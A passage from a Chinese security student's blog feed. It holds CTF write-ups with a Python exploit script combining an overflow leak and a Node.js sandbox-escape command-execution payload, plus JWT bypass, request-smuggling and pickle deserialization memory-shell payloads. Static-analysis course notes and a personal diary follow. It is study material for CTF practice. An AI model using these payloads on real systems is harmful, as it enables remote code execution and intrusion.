class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        exploit.append(<span class="built_in">str</span>(i))</span><br><span class="line">    exploit.append(<span class="string">&quot;28&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;[[ 0 ]]&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;stdin&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;1111111&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;222222&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;63&quot;</span>)            <span class="comment"># 通过溢出覆盖write的参数实现越界读</span></span><br><span class="line"></span><br><span class="line">    jsondata = &#123;</span><br><span class="line">        <span class="string">&quot;stdin&quot;</span>: exploit</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    resp1 = s.post(url=url, json=jsondata)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;PIE: <span class="subst">&#123;<span class="built_in">int</span>(resp1.content.decode()[<span class="number">36</span>:<span class="number">46</span>]) - <span class="number">24</span>&#125;</span>&quot;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(resp1.content.decode()[<span class="number">36</span>:<span class="number">46</span>]) - <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeCmd</span>(<span class="params">pie</span>):</span><br><span class="line">    s = requests.session()</span><br><span class="line">    exploit = []</span><br><span class="line">    </span><br><span class="line">    payload2 = <span class="string">&#x27;const process = this.constructor.constructor(&quot;return this.process&quot;)();process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag &gt; /app/index.html&quot;).toString()&#x27;</span></span><br><span class="line"></span><br><span class="line">    exploit.append(<span class="string">&quot;(function (...a)&#123; console.log(\&quot;hack\&quot;);&quot;</span> + payload2 + <span class="string">&quot;;return a.map(s=&gt;console.log(s)).join(\&quot; \&quot;); &#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">        exploit.append(<span class="built_in">str</span>(i))</span><br><span class="line">    </span><br><span class="line">    exploit.append(<span class="string">&quot;28&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">f&quot;<span class="subst">&#123;pie&#125;</span>&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;stdin&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;1&quot;</span>)      <span class="comment"># size</span></span><br><span class="line">    exploit.append(<span class="string">f&quot;<span class="subst">&#123;pie+<span class="number">42</span>&#125;</span>&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;stdin&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    jsondata = &#123;</span><br><span class="line">        <span class="string">&quot;stdin&quot;</span>: exploit</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    resp1 = s.post(url=url, json=jsondata)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(resp1.content)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pie = readThePIE()</span><br><span class="line">    writeCmd(pie)</span><br></pre></td></tr></table></figure><h3 id="doctor（复现）"><a href="#doctor（复现）" class="headerlink" title="doctor（复现）"></a>doctor（复现）</h3><h4 id="新知识点"><a href="#新知识点" class="headerlink" title="新知识点"></a>新知识点</h4><ul><li>go embed</li></ul><p>参考：<a href="https://zhuanlan.zhihu.com/p/351931501">https://zhuanlan.zhihu.com/p/351931501</a></p><p>这是go1.16中引入的新特性，通过<code>//go:embed</code>指令，可以在编译阶段将静态资源文件打包进编译好的程序中，并提供访问这些文件的能力</p><p>例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//go:embed dist/*</span></span><br><span class="line"><span class="keyword">var</span> f embed.FS</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed dist/index.html</span></span><br><span class="line"><span class="keyword">var</span> html <span class="type">string</span></span><br></pre></td></tr></table></figure><p>作用：将静态资源打包入二进制程序，防止静态资源丢失以影响程序执行，常用于Go模板、静态web服务、数据库迁移等</p><p>使用：</p><p>在embed中，可以将静态资源文件嵌入到三种类型的变量中，分别为字符串、字节数组、<code>embed.FS</code>文件类型中</p><ul><li>读取文件到字符串中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">_ <span class="string">&quot;embed&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed version.txt</span></span><br><span class="line"><span class="keyword">var</span> version <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(version)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>读取文件到字节数组中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    _ <span class="string">&quot;embed&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed version.txt</span></span><br><span class="line"><span class="keyword">var</span> versionByte []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;version %q\n&quot;</span>, <span class="type">string</span>(versionByte))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>使用<code>embed.FS</code>管理目录</p><p>这里主要涉及三种方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open 打开要读取的文件，并返回文件的fs.File结构.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f FS)</span></span> Open(name <span class="type">string</span>) (fs.File, <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ReadDir 读取并返回整个命名目录</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f FS)</span></span> ReadDir(name <span class="type">string</span>) ([]fs.DirEntry, <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ReadFile 读取并返回name文件的内容.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f FS)</span></span> ReadFile(name <span class="type">string</span>) ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br></pre></td></tr></table></figure><p>一个用于展示static目录的demo</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;embed&quot;</span></span><br><span class="line">_ <span class="string">&quot;embed&quot;</span></span><br><span class="line"><span class="string">&quot;io/fs&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">useOS := <span class="built_in">len</span>(os.Args) &gt; <span class="number">1</span> &amp;&amp; os.Args[<span class="number">1</span>] == <span class="string">&quot;live&quot;</span></span><br><span class="line">http.Handle(<span class="string">&quot;/&quot;</span>, http.FileServer(getFileSystem(useOS)))</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8888&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed static</span></span><br><span class="line"><span class="keyword">var</span> embedFiles embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileSystem</span><span class="params">(useOS <span class="type">bool</span>)</span></span> http.FileSystem &#123;</span><br><span class="line"><span class="keyword">if</span> useOS &#123;<span class="comment">// live模式类似于hot-deploy, 直接读取宿主机环境上的static目录进行显示</span></span><br><span class="line">log.Print(<span class="string">&quot;using live mode&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> http.FS(os.DirFS(<span class="string">&quot;static&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Print(<span class="string">&quot;using embed mode&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用打包进二进制程序的static目录</span></span><br><span class="line">fsys, err := fs.Sub(embedFiles, <span class="string">&quot;static&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> http.FS(fsys)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="d3pythonhttp（复现）"><a href="#d3pythonhttp（复现）" class="headerlink" title="d3pythonhttp（复现）"></a>d3pythonhttp（复现）</h3><p>考点：JWT鉴权绕过、请求走私、pickle反序列化</p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>鉴权依靠jwt，在<code>/login</code>路由下生成jwt的token，在<code>/admin</code>路由下进行<code>verify_token</code></p><p>一开始想着怎么进行<code>fronted_key</code>泄露，其实这是一个逻辑洞的绕过</p><p>根据JWT的结构，头部部分可以进行伪造，而key的获取是依靠于头部中的kid字段来确定的，即我们可以随便指定一个路径使得get_key触发异常直接pass，然后返回空</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807430.png" alt="image-20240502145337969"></p><h4 id="走私绕过"><a href="#走私绕过" class="headerlink" title="走私绕过"></a>走私绕过</h4><p>前后端中对于<code>Backdoor..</code>字符串的处理不同，我们需要利用前端和后端对于TE的解析差异进行走私</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807105.png" alt="image-20240502163953630"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807442.png" alt="image-20240502163920761"></p><p>对于TE头的具体解析差异如下：</p><p>前端全转小写</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807391.png" alt="image-20240502164207102"></p><p>后端对大小写敏感</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807852.png" alt="image-20240502164232879"></p><p>也就是说，我们可以使用大小写使得TE头在前端成功解析，但是在后端使用CL解析，即TE-CL走私</p><ul><li>关于TE头</li></ul><p>设置了 <code>Transfer-Encoding: chunked</code> 后，请求主体按一系列块的形式发送，并将省略 <code>Content-Length</code>。在每个块的开头需要用十六进制数指明当前块的长度，数值后接 <code>\r\n</code>（占 2 字节），然后是块的内容，再接 <code>\r\n</code> 表示此块结束。最后用长度为 0 的块表示终止块。终止块后是一个 trailer，由 0 或多个实体头组成，可以用来存放对数据的数字签名等。</p><p>格式如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-stylus"><span class="selector-tag">b</span></span></span><br><span class="line"><span class="language-stylus">q=smuggling</span></span><br><span class="line"><span class="language-stylus"><span class="number">6</span></span></span><br><span class="line"><span class="language-stylus">hahaha</span></span><br><span class="line"><span class="language-stylus"><span class="number">0</span></span></span><br><span class="line"><span class="language-stylus"><span class="selector-attr">[空白行]</span></span></span><br><span class="line"><span class="language-stylus"><span class="selector-attr">[空白行]</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\nHost: 1.com\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\nb\r\nq=smuggling\r\n6\r\nhahaha\r\n0\r\n\r\n</span><br></pre></td></tr></table></figure><h4 id="webpy下的内存马"><a href="#webpy下的内存马" class="headerlink" title="webpy下的内存马"></a>webpy下的内存马</h4><p>算是第一次碰到这个框架</p><p>查看源码，可以发现有<code>processors</code>的变量，类似于一个<code>filter</code>的用法</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021653498.png" alt="image-20240502164858824"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021653263.png" alt="image-20240502165248494"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021653911.png" alt="image-20240502165332488"></p><p>生成opcode，添加一个Processor进去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>, (<span class="string">&quot;app.add_processor((lambda self : __import__(&#x27;os&#x27;).popen(&#x27;cat /home/ctf/flag&#x27;).read()))&quot;</span>,)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">exp = exploit()</span><br><span class="line">exp_str = pickle.dumps(exp, protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(exp_str))</span><br></pre></td></tr></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>感觉使用bp很容易出问题，所以想方设法使用脚本发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247485683&idx=1&sn=59a3ab77c368f4a06173f06ba6acc8f4&chksm=cf5ee8a5f82961b3369d0442ef2b09e0c09133192349b7d76f1c829458cb0c66aed0723b4a40&mpshare=1&scene=23&srcid=05027by9GN73PBRo2Fb8sIO9&sharer_shareinfo=e4946fbe5ac0cfc0ad85a20ab1ae04a3&sharer_shareinfo_first=e4946fbe5ac0cfc0ad85a20ab1ae04a3#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247485683&amp;idx=1&amp;sn=59a3ab77c368f4a06173f06ba6acc8f4&amp;chksm=cf5ee8a5f82961b3369d0442ef2b09e0c09133192349b7d76f1c829458cb0c66aed0723b4a40&amp;mpshare=1&amp;scene=23&amp;srcid=05027by9GN73PBRo2Fb8sIO9&amp;sharer_shareinfo=e4946fbe5ac0cfc0ad85a20ab1ae04a3&amp;sharer_shareinfo_first=e4946fbe5ac0cfc0ad85a20ab1ae04a3#rd</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJU-Static-Analysis-Data-Flow-Analysis-2</title>
      <link href="/2024/05/01/StaticAnalysis/NJU-Static-Analysis-Data-Flow-Analysis-2/"/>
      <url>/2024/05/01/StaticAnalysis/NJU-Static-Analysis-Data-Flow-Analysis-2/</url>
      
        <content type="html"><![CDATA[<h1 id="NJU-Static-Analysis-Data-Flow-Analysis-2"><a href="#NJU-Static-Analysis-Data-Flow-Analysis-2" class="headerlink" title="NJU-Static-Analysis-Data-Flow-Analysis-2"></a>NJU-Static-Analysis-Data-Flow-Analysis-2</h1><h2 id="Live-Variables-Analysis"><a href="#Live-Variables-Analysis" class="headerlink" title="Live Variables Analysis"></a>Live Variables Analysis</h2><h3 id="Live-Variables-定义"><a href="#Live-Variables-定义" class="headerlink" title="Live Variables 定义"></a>Live Variables 定义</h3><p>活跃变量（Live Variables）：</p><blockquote><p><strong>程序点p处的变量v是活变量</strong>，当且仅当在CFG中存在某条从p开始的路径，在这条路径上变量v被使用了，且在使用前未被重定义（但是不要求v在p之前必须被定义到）</p></blockquote><blockquote><p>可应用于寄存器分配（Register Allocation），可以作为编译器优化的参考信息。比如说，如果在某个程序点处，所有的寄存器都被占满了，而我们又需要用一个新的寄存器，那么我们就要从已经占满的这些寄存器中选择一个去覆盖它的旧值，我们应该更青睐于去覆盖那些储存死变量的寄存器。</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012223818.png" alt="image-20240501203950973"></p><h3 id="使用bit-vector来表示活跃变量中的数据流值"><a href="#使用bit-vector来表示活跃变量中的数据流值" class="headerlink" title="使用bit vector来表示活跃变量中的数据流值"></a>使用bit vector来表示活跃变量中的数据流值</h3><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012223514.png" alt="image-20240501205202538"></p><p>​$V_i &#x3D; 1$表示$i$对应的变量为活跃变量</p><h3 id="Transfer-function和control-flow"><a href="#Transfer-function和control-flow" class="headerlink" title="Transfer function和control flow"></a>Transfer function和control flow</h3><ul><li>一个例子：</li></ul><p>​主要是理解活跃变量的定义：</p><blockquote><p>redefine之前进行use</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012220468.png" alt="image-20240501221715873"></p><p>​4的那种情况可以拆解成先use再redefine</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012220471.png" alt="image-20240501222000204"></p><ul><li>所以归纳出公式</li></ul><p>$use_B$ 指在Basic Block $B$中在redefine之前use到的变量，在其对应的bit vector位置上记为1</p><p>$def_B$ 指在Basic Block $B$中在redefine对应的变量上，bit vector置为1，并为kill操作做准备</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012223257.png" alt="image-20240501221649741"></p><h3 id="活跃变量分析算法"><a href="#活跃变量分析算法" class="headerlink" title="活跃变量分析算法"></a>活跃变量分析算法</h3><p>​也是一个Iteration的算法，所以开头的初始化按照模板来走，分成了两部分</p><p>​接下来就是对每个$OUT[B]$和$IN[S]$的声明了</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012223890.png" alt="image-20240501220925383"></p><p>​例子详情见ppt，讲得很通俗易懂</p><h2 id="Available-Expression-Analysis"><a href="#Available-Expression-Analysis" class="headerlink" title="Available Expression Analysis"></a>Available Expression Analysis</h2><h3 id="Available-Expression-定义"><a href="#Available-Expression-定义" class="headerlink" title="Available Expression 定义"></a>Available Expression 定义</h3><p>可用表达式分析（Available Expression）：</p><blockquote><p>表达式<code>x op y</code>在程序点<code>p</code>是可用的 &lt;&#x3D;&gt; </p><ul><li><strong>所有</strong>程序入口点到程序点p的路径都必须经过<code>x op y</code>表达式的<code>Evaluation</code></li><li>在最后一次<code>x op y</code>的评估之后，没有<code>x</code>或者<code>y</code>的重定义</li></ul><p>对于程序中每个程序点处的可用表达式分析，称之为 可用表达式分析（Available Expression Analysis）</p></blockquote><p>available expression是一种优化层次上的数据流分析对象，由于是优化，不可错报可以漏报，是一种must analysis。</p><p>考虑如下这个例子：</p><p>在1处定义了一个表达式，其中的表达式为$e^{16}*x$，在$BB_2$后，即使先对$x$进行重定义，但是之后仍旧使用了$b &#x3D; e^{16} * x$，因此$b &#x3D; e^{16} * x$仍旧是available，最后让两条edge上的PP做交，可以得到汇入$BB_3$的表达式状态</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405031241038.png" alt="image-20240503123329295"></p><h3 id="Transfer-function和control-flow-1"><a href="#Transfer-function和control-flow-1" class="headerlink" title="Transfer function和control flow"></a>Transfer function和control flow</h3><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405031253952.png" alt="image-20240503124319536"></p><h3 id="可用表达式的分析算法"><a href="#可用表达式的分析算法" class="headerlink" title="可用表达式的分析算法"></a>可用表达式的分析算法</h3><p>值得注意的点如下：</p><ul><li><p>整个算法在控制流图中的分析方向：从entry自顶向下按顺序分析，入口点处的$OUT[entry]&#x3D;null$</p></li><li><p>对于其他PP处的$OUT[B]$设置为全1</p></li><li><p>在控制流汇聚的时候，对于$OUT[B]$的处理需要做interaction，作为下一个$BB$的输入</p></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405031252691.png" alt="image-20240503124402882"></p><h2 id="三种数据流分析的比较"><a href="#三种数据流分析的比较" class="headerlink" title="三种数据流分析的比较"></a>三种数据流分析的比较</h2><p>这里重点回顾下 <strong>到达定值分析</strong> 和 <strong>活跃变量分析</strong>，感觉这两个分析对象很容易混淆</p><ul><li>到达定值分析和活跃变量分析都是以并集作为交汇运算，我们主要关心的是其中一条路径上是否满足我们所想要的性质，而不关心所有路径</li><li>活跃变量分析是逆向遍历的（从exit为分析入口点，与控制流方向相反），且针对的是某个变量，关注的是程序点p上的对变量x的使用可以被传递到在某个执行路径中p之前的所有程序点。</li><li>到达定值分析，正向分析，针对的是definition，我们关注的是程序点p上的definition对于x的定义是否可以传播到某条执行路径中的且在p之后的程序点。</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012220468.png"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404302223446.png" alt="image-20240430220521445"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405031256976.png" alt="image-20240503125613247"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Static Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的2024年四月</title>
      <link href="/2024/04/21/Diary/diary-2024-04-21/"/>
      <url>/2024/04/21/Diary/diary-2024-04-21/</url>
      
        <content type="html"><![CDATA[<h1 id="日记"><a href="#日记" class="headerlink" title="日记"></a>日记</h1><h1 id="四月-の-小记"><a href="#四月-の-小记" class="headerlink" title="四月 の 小记"></a>四月 の 小记</h1><p>四月，又称为清和月，既没有冬雪的凛冽，也没有夏日的炎热，自有清爽和气之感</p><h2 id="2024-04-04-–-武汉：🌸和藕的城市"><a href="#2024-04-04-–-武汉：🌸和藕的城市" class="headerlink" title="2024.04.04 – 武汉：🌸和藕的城市"></a>2024.04.04 – 武汉：🌸和藕的城市</h2><p> 武汉，其实之前就很想去了，因为武汉这座城市在我的记忆里是以樱花落雨的画面出现的</p><p>欲买桂花同载酒，终不似，少年游。</p><p>作为南方人，我很喜欢那种雨后那种潮湿的空气充斥肺腑的清爽感，于是少年也很喜欢在长江大桥上吹吹江风</p><p>我的学校附近没有夜市，所以自然而然，武汉的夜市都会给我一种明亮和新鲜的感觉</p><p>我想我以后也喜欢那种下完班或者夜晚和喜欢的人出来散步之后还能有淀粉肠、烤面筋小摊的城市叭</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212244883.jpg" alt="IMG_20240404_185710"></p><p>清明雨落，樱花亦落，武大的樱花算是没看到了，人看人可还行，打卡了武大的几个景点</p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212329144.jpg" alt="IMG_20240405_130328_edit_696557426445274" style="zoom: 50%;" /><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212329533.jpg" alt="IMG_20240405_143225" style="zoom: 50%;" /><p>后面还去了黄鹤楼，的楼下，以及citywalk…</p><h2 id="2024-04-13-–-HASHCTF：做出题人，收获颇丰"><a href="#2024-04-13-–-HASHCTF：做出题人，收获颇丰" class="headerlink" title="2024.04.13 – HASHCTF：做出题人，收获颇丰"></a>2024.04.13 – HASHCTF：做出题人，收获颇丰</h2><p>第一次以主要出题人的身份，自己算是很认真的对待这次出题了，自己调了好久的程序，可惜还是没处理好dockerfile，被打了非预期，还是太菜了www，感谢大家的理解和对比赛的支持</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327900.png" alt="image-20240421231157944"></p><h2 id="2024-04-21-–-天津：awd和渗透，web🐕猪脑过载了"><a href="#2024-04-21-–-天津：awd和渗透，web🐕猪脑过载了" class="headerlink" title="2024.04.21 – 天津：awd和渗透，web🐕猪脑过载了"></a>2024.04.21 – 天津：awd和渗透，web🐕猪脑过载了</h2><p>来程高铁上拍的，有点故乡の原风景那味了hhh</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327850.jpg" alt="IMG_20240420_101422"></p><p>​打完长城杯天津的线下赛，第一次打线下awd和第二次打线下渗透赛 … 整支队伍里只有我一个web手，幸好队里还有个misc大爹，算是一个人扛多台靶机哈哈哈，有点猪脑过载的感觉。</p><p>​感谢学校出了差旅费，第一次住五星级酒店（土狗抬头望望），回酒店浴缸里泡了个澡，</p><p>​最后水水拿了个二等</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327842.jpg" alt="IMG_20240421_165339"></p><p>​铁三，永远的第一届</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327055.jpg" alt="IMG_20240420_160713"></p><p>​</p><blockquote><p>喜报：进决赛了诶😊</p></blockquote><h2 id="2024-04-21-2024-04-30-–-期中考：我和你势不两立"><a href="#2024-04-21-2024-04-30-–-期中考：我和你势不两立" class="headerlink" title="2024.04.21 - 2024.04.30 – 期中考：我和你势不两立"></a>2024.04.21 - 2024.04.30 – 期中考：我和你势不两立</h2><p>感觉上学越上越久，觉得在学校里，无非只是能更为自由地支配自己学习的时间罢了</p><p>至于学什么，我觉得还是得靠自己的主动性</p><p>以及课上的东西，压根不够，更何况是密码课程居多的学院呢</p><blockquote><p>所以，呜呜呜我好菜学不完了，期中考啥都不会</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327291.png" alt="image-20240421232708658"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀中的unhook手法(持续更新)</title>
